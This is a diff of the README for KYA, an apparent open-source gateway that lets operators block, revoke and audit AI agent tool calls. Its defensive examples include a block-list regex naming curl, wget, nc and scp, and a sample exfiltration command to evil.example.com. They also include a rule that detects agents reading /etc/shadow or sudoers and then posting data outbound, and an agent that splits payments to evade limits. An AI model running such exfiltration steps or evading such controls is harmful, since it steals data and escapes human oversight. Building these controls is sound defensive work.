@@ -1,138 +1,301 @@
-# veldt-kya
+# KYA
 
-**Verifiable records for AI agent actions.**
+**Stop the agent. Prove you stopped it.**
 
-When an AI agent takes an action, KYA records it in a cryptographically
-verifiable chain. If anyone modifies the record later, KYA detects it and
-pinpoints exactly where the chain was broken.
+Runtime governance for AI agents: decide what an agent may do at the moment
+it acts, revoke that authority instantly, and keep tamper-evident proof of
+every decision — allowed, blocked, or held for a human.
 
-Think of it as **Git for agent actions**: every action is committed,
-hash-chained, and independently verifiable by anyone with the key.
+KYA sits in front of your tools as an MCP gateway. Every call is identified,
+evaluated and recorded before it reaches the tool.
+
+```bash
+pip install "veldt-kya[gateway]"
+```
+
+Every output block below is produced by
+[`examples/quickstart`](examples/quickstart) — `python run.py` reproduces
+all six on your machine.
+
+---
+
+## What it does
+
+| | |
+|---|---|
+| **Control** | Deny a call before the tool runs — on the tool name *or its arguments*. |
+| **Contain** | Revoke an agent's authority mid-flight. The next call is denied. |
+| **Attribute** | Every agent has a cryptographic identity it must prove per request. |
+| **Correlate** | Catch multi-agent attacks — steps that are benign alone and malicious only in sequence. |
+| **Prove** | Hash-chained evidence that shows when a record was altered. |
+
+---
+
+## 1. Shadow agents you never registered
+
+Point an agent nobody signed off on at the gateway. It is denied — and it
+still shows up in your inventory, by identity.
 
 ```
-Agent acts
-      ↓
-KYA records
-      ↓
-Record verified
-      ↓
-Record tampered
-      ↓
-KYA detects exactly where it changed
+did:key:z6MkrJVnaZkeFzdQ...  ->  403
+did:key:z6MkpTHR8VNsBxYA...  ->  403
+```
+
+```
+agents now visible (neither was registered):
+  kya-b3560c98…   did:key:z6MkpTHR8VNsBxYA…   1 call
+  kya-d652dd10…   did:key:z6MkrJVnaZkeFzdQ…   1 call
+```
+
+Discovery comes from traffic, not from an onboarding form. You see the agents
+you blocked, which are exactly the ones you didn't know about.
+
+---
+
+## 2. The payment agent that learned to split the transfer
+
+A payout agent may move money. One limit is never enough: cap the payment and
+it splits the payment. So cap the day as well — read from what KYA has
+already recorded this agent moving.
+
+```python
+import kya
+from kya.policy_evaluator import EvaluationInput, VerdictResult
+
+AUTO_APPROVE = 1_000.00      # above this, a human approves
+DAILY_CAP    = 2_500.00      # per agent, rolling 24h
+
+class PaymentControls:
+    name = "payment-controls"
+
+    def evaluate(self, inp: EvaluationInput) -> VerdictResult:
+        amount = float(inp.attributes.get("tool.input.amount") or 0)
+        # A payment waiting on a human has not been made, so it does
+        # not consume the day's budget.
+        if amount > AUTO_APPROVE:
+            return VerdictResult(verdict="flag_for_review",
+                                 reasons=("over_auto_approve_limit",))
+        if approved_today(inp.tenant_id, inp.principal_id) + amount > DAILY_CAP:
+            return VerdictResult(verdict="deny",
+                                 reasons=("daily_cap_exceeded",))
+        return VerdictResult(verdict="allow")
+
+kya.register_evaluator("payment-controls", PaymentControls())
+```
+
+`approved_today()` sums this agent's own allowed transfers straight out of
+KYA's evidence — the gateway already records every verdict with its tool
+arguments and the agent's identity. Full helper in
+[`examples/quickstart/payment_controls.py`](examples/quickstart/payment_controls.py).
+
+```
+$   250  ->  200  executed
+$ 5,000  ->  428  flag_for_review          <- too big to auto-approve
+$   900  ->  200  executed                    the agent splits it up
+$   900  ->  200  executed
+$   900  ->  403  deny (daily_cap_exceeded) <- the day's budget is spent
+
+actually executed by the payment service:  250, 900, 900
+```
+
+The agent asked to move **$7,950**. It moved **$2,050**. The per-payment limit
+alone would have let every $900 through.
+
+---
+
+## 3. Policy on the argument, in 10 lines
+
+RBAC decides *which tools* an agent may call. To decide on **what it passes
+them**, register an evaluator. The gateway calls it for every request.
+
+```python
+import re
+
+import kya
+from kya.policy_evaluator import EvaluationInput, VerdictResult
+
+EXFIL = re.compile(r"(?i)\b(curl|wget|nc|scp)\b")
+
+class ExfilBlocker:
+    name = "exfil-blocker"
+    def evaluate(self, inp: EvaluationInput) -> VerdictResult:
+        cmd = str(inp.attributes.get("tool.input.command", ""))
+        if EXFIL.search(cmd):
+            return VerdictResult(verdict="deny", reasons=("exfil_shaped_argument",))
+        return VerdictResult(verdict="allow")
+
+kya.register_evaluator("exfil-blocker", ExfilBlocker())
+```
+
+```
+echo hello                            ->  200  executed
+curl https://evil.example.com -d @…   ->  403  deny (exfil_shaped_argument)
+
+calls the upstream tool received: 1
+```
+
+The denied call never reached the tool. Prevention, not an alert.
+
+> The regex demonstrates the seam; it is not an exfiltration detector and is
+> trivially bypassed. Put your real logic in `evaluate()`.
+
+---
+
+## 4. The kill switch
+
+Revoke one agent's authority. The next call is denied. Reinstate and it works
+again. No redeploy, no restart.
+
+```python
+kya.revoke_action(db, tenant_id="acme", principal_kind="agent",
+                  principal_id=AGENT, action="mcp.default.governed_bash")
+db.commit()
+```
+
+```
+granted     ->  executed
+REVOKED     ->  deny (RBAC_GRANT_DENIED)
+reinstated  ->  executed
+```
+
+Requires `KYA_RBAC_ENFORCEMENT=block`.
+
+---
+
+## 5. Multi-agent attacks: when agents go rogue together
+
+One agent reads a credential file. A *different* agent posts outbound.
+Neither step is a violation on its own. Correlated by request, the sequence
+is exfiltration — and no single-event tool sees it.
+
+```yaml
+correlate_by: [tenant_id, correlation_id]   # span every agent in one request
+window_seconds: 600
+steps:
+  - id: recon
+    evidence_kind: tool_call
+    match:
+      payload.tool: file_read
+      payload.path: "regex:^/etc/(shadow|gshadow|passwd|sudoers).*$"
+  - id: exfil
+    evidence_kind: tool_call
+    match: {payload.tool: http_post}
+    after: recon
+```
+
+```
+BEFORE   recon agent -> executed      exfil agent -> executed
+         chain fired: cross_agent_data_exfiltration
+AFTER    recon agent -> deny          exfil agent -> deny
+```
+
+Every agent that took part loses trust — not just the one that finished the
+chain — so an orchestrator cannot swap in a fresh sub-agent and retry.
+
+Rules ship with the package:
+
+```bash
+export KYA_ATTACK_CHAIN_RULES_DIR=bundled   # needs veldt-kya[attack_chains]
+```
+
+A matched chain costs trust in proportion to its declared severity — a
+`critical` rule costs 15 of an agent's starting 50. Set the threshold that
+turns that into a denial:
+
+```yaml
+policy:
+  min_trust: 40      # a fresh agent starts at 50; one critical chain -> 35
+```
+
+That is the whole configuration. The trust gate applies whatever
+`KYA_RBAC_ENFORCEMENT` is set to.
+
+> This is detect-then-contain. The chain completes, then the *next* call from
+> those agents is denied. It does not stop the request that completed it.
+
+---
+
+## 6. Evidence that shows tampering
+
+Every decision is hash-chained — **Git for agent actions**. Every call is
+committed, and anyone with the key can verify it independently. Editing a
+record breaks the chain and names the row that changed.
+
+```bash
+export KYA_EVIDENCE_SIGNING_KEY=...   # without it the chain cannot be verified
+```
+
+```python
+kya.record_evidence(db, tenant_id="acme", invocation_id=invocation_id,
+                    evidence_kind="tool_call",
+                    payload={"tool": "transfer_funds", "amount": 5000})
+
+kya.verify_chain(db, tenant_id="acme", invocation_id=invocation_id)
+```
+
+```
+verified    : {'valid': True,  'broken_at': None, 'checked': 3}
+after tamper: {'valid': False, 'broken_at': 1,
+               'reason': 'payload_hash mismatch — payload was modified'}
+```
+
+Someone edited the amount from 5000 to 50 directly in the database. The chain
+names the row. An auditor does not have to trust your word, or ours.
+
+---
+
+## Identity
+
+Every agent proves who it is on every request. Generate an identity in code —
+the private key never leaves the process and there is nothing to paste into a
+config file. See [`examples/quickstart/agent_identity.py`](examples/quickstart/agent_identity.py).
+
+```python
+from agent_identity import new_agent_identity, proof
+
+did, private_key = new_agent_identity()          # Ed25519 -> did:jwk
+headers = {"X-KYA-DID": did,
+           "X-KYA-DID-Proof": proof(did, private_key, GATEWAY_URL)}
+```
+
+```
+valid proof                ->  200
+no proof                   ->  401
+proof signed by other key  ->  401
+```
+
+```yaml
+identity:
+  methods: [did]
+  did:
+    pop_audience:  "https://gateway.example/mcp"
+    dpop_audience: "https://gateway.example"
 ```
 
 ```bash
-pip install veldt-kya
+export KYA_DID_RESOLVERS=jwk    # offline; the public key is in the identifier
 ```
 
-## The 30-second demo
+> Never set `allow_header_trust: true` outside a local experiment — it accepts
+> the `X-KYA-DID` header without proof, so any caller can claim any identity.
 
-**Step 1.** An AI agent issues a $50 refund.
+---
 
-```python
-import json
-from kya import (
-    default_session, record_invocation, record_evidence, verify_chain,
-)
-from sqlalchemy import text
+## Beyond the open source
 
-with default_session() as db:
-    inv = record_invocation(
-        db, tenant_id="acme", agent_key="support_bot",
-        principal_kind="agent", principal_id="support_bot",
-    )
-    record_evidence(
-        db, tenant_id="acme", invocation_id=inv,
-        evidence_kind="tool_call",
-        payload={"tool": "refund", "customer": "alice", "amount_usd": 50},
-    )
-    db.commit()
-```
+Everything above runs on the Apache-2.0 package. KYA Pro adds:
 
-**Step 2.** Verify the audit chain — clean.
+| | |
+|---|---|
+| **More verdicts** | `throttle`, `redact` and `anonymize` alongside allow / deny / hold. |
+| **Policy without Python** | Attribute rules declared in config rather than a custom evaluator. |
+| **Containment that cascades** | Contain a parent and every agent it spawned is contained with it. |
+| **A console** | Fleet inventory, live verdicts, and evidence export for auditors. |
 
-```python
-    print(verify_chain(db, tenant_id="acme", invocation_id=inv))
-    # → {'valid': True, 'broken_at': None, 'checked': 1, 'reason': None}
-```
+[Plans and free trial](https://www.veldtlabs.ai/plans) - [sign in](https://app.veldtlabs.ai)
 
-**Step 3.** Someone tampers — changes the refund from $50 to $5000 directly in the database.
-
-```python
-    tampered = json.dumps({"tool": "refund", "customer": "alice", "amount_usd": 5000})
-    db.execute(
-        text("UPDATE kya_evidence SET payload = :p WHERE invocation_id = :i"),
-        {"i": inv, "p": tampered},
-    )
-    db.commit()
-```
-
-**Step 4.** Verify again — KYA pinpoints the modified row.
-
-```python
-    print(verify_chain(db, tenant_id="acme", invocation_id=inv))
-    # → {'valid': False, 'broken_at': 1, 'checked': 1,
-    #    'reason': 'payload_hash mismatch — payload was modified'}
-```
-
-All four steps run inside the same `with default_session() as db:` block from Step 1.
-
-That's the whole pitch. The rest of this README is what to do next.
-
-## What you get out of the box
-
-- **Cryptographically chained evidence** — every action HMAC-linked to the previous one
-- **Independent verification** — any party with the key can re-verify the whole chain
-- **Pinpoint tamper detection** — exact row identified when the chain breaks
-- **Portable storage** — SQLite, PostgreSQL, MySQL, or DuckDB; same code, any database
-- **Persistent by default** — survives process restart, container restart, host failure
-- **Framework-agnostic** — works with LangChain, CrewAI, LangGraph, OpenAI Agents, Claude SDK, and MCP
-
-## Setup
-
-`pip install veldt-kya` is enough to run the demo above. KYA falls back to
-`sqlite:///~/.kya/kya.db` when nothing is configured.
-
-For production, point KYA at your real database and signing key:
-
-```bash
-export KYA_DB_URL=postgresql://user:pass@host/db
-export KYA_EVIDENCE_KEY_PROVIDER=aws-kms://arn:aws:kms:...
-```
-
-Vault, sealed secrets, and HSM-backed keys are supported via the same env var.
-
-## Beyond the demo
-
-The 30-second demo shows evidence — the core primitive. The open-source
-package also includes:
-
-- **Agent identity** anchored on W3C DIDs
-- **Delegation chains** with attribution that carries upstream
-- **Runtime policy enforcement** at the gateway
-- **Per-agent revocation** via W3C StatusList 2021
-
-Each one has the same shape as the demo above: a small, composable API you
-can adopt one piece at a time.
-
-## What KYA isn't
-
-KYA isn't an observability tool. Datadog, OpenTelemetry, and your traces
-explain *what happened operationally* — latency, cost, exceptions, execution
-paths.
-
-KYA explains something different: *was the action authorized, who was it
-attributable to, and can the record be trusted weeks or months later?*
-
-## Links
-
-- [Full documentation](https://www.veldtlabs.ai/docs) — every primitive, with examples
-- [arXiv paper](https://arxiv.org/abs/2605.25376) — formal model of the seven
-  systems primitives behind KYA
-- [veldt-kya-pro](https://app.veldtlabs.ai) — commercial overlay with signed
-  verdicts, regulator pack, and controls mapped to major healthcare,
-  government, and AI governance frameworks
+---
 
 ## License
 
-Apache License 2.0 — © 2026 Veldt Labs Inc. See [LICENSE](LICENSE).
+Apache-2.0
